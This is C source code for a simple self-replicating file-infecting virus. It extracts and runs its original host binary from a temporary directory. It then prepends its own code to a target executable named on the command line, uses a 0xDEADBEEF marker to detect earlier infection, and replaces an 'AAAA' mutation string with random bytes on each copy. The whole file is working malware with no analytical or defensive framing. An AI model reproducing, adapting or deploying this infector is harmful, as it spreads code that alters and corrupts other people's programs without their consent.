#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

int check_infected(FILE*);
int infect(char* path, char* self_path, struct stat file_stat);

int main(int argc, char** argv)
{

	char* dead = "AAAAAAAA";

	//Search for the original binary
	FILE* self = fopen(argv[0], "r");

	//Read until the host binary is found
	check_infected(self);

	//Make the host binary
	mkdir("tem", 0777);
	FILE* exe = fopen("tem/host", "w");
	chmod("tem/host", 0777);

	int c;

	while((c = fgetc(self)) != EOF)
	{
		fputc(c, exe);
	}
	fclose(exe);


	//Execute the host binary
	if(fork() != 0)
	{
		execv("./tem/host", argv);
	}

	usleep(100000);

	//Clean up
	unlink("./tem/host");

	//Wait for the file to unlink
	usleep(10000);

	//Slash the directory
	rmdir("./tem");
	
	//Check to see a file was specified
	if(argc < 2) exit(0);

	//Check whether victim file exists

	FILE* to_infect;

	//Attempt to open file
	if ((to_infect = fopen(argv[1], "r")) == 0)
	{
		//File does not exist
		exit(0);
	}


	struct stat stat_results;
	stat(argv[1], &stat_results);

	//Drop off the execute bit
	chmod(argv[1], stat_results.st_mode & (~S_IXUSR));

	//Update the permissions variable to be passed later
	stat(argv[1], &stat_results);
	
	//Check if already infected
	if(check_infected(to_infect))
	{
		exit(0);
	}

	fclose(to_infect);
		
	//If not, infect
	infect(argv[1], argv[0], stat_results);

	exit(0);


}

int infect(char* path, char* self_path, struct stat file_stat)
{

	FILE* file = fopen(path, "r");
	FILE* self = fopen(self_path, "r");

	FILE* out = fopen("tmpout", "w");
	chmod("tmpout", file_stat.st_mode);

	//Character buffer for copying
	int c;

	//Character buffer for comparing against 0xDEADBEEF
	unsigned char match[4];

	//Copy the virus
	while(1)
	{

		//Read and write the character
		c = fgetc(self);

		fputc(c, out);
	
		match[0] = match[1];
		match[1] = match[2];
		match[2] = match[3];
		match[3] = (unsigned char)c;

		if(match[0] == 0xde && match[1] == 0xad && match[2] == 0xbe && match[3] == 0xef)
		{
			break;
		}

		//Search for the mutation string
		if(match[0] == 'A' && match[1] == 'A' && match[2] == 'A' && match[3] == 'A')
		{

			for(int i = 0; i < 4; i++)
			{
				//Pop one of the 'A' characters
				fgetc(self);
				//Put out a random character
				fputc((clock() % 255), out);
				usleep(2000);
				//Empty out the match buffer
				match[i] = 0;
			};
		}


	}

	fclose(self);

	//Copy the file
	while((c = fgetc(file)) != EOF)
	{
		fputc(c, out);
	}

	//Delete the original file
	remove(path);

	
	//Rename tmpout
	rename("tmpout", path);
	
	return 1;

}

int check_infected(FILE* file)
{


	int c = 0;
	unsigned char match[4] = {};


	//Search for 0xdeadbeef
	while((c = fgetc(file)) != EOF)
	{

		match[0] = match[1];
		match[1] = match[2];
		match[2] = match[3];
		match[3] = c;


		if(match[0] == 0xde && match[1] == 0xad && match[2] == 0xbe && match[3] == 0xef)
		{
			return 1;
		}

	}
	
	return 0;

}
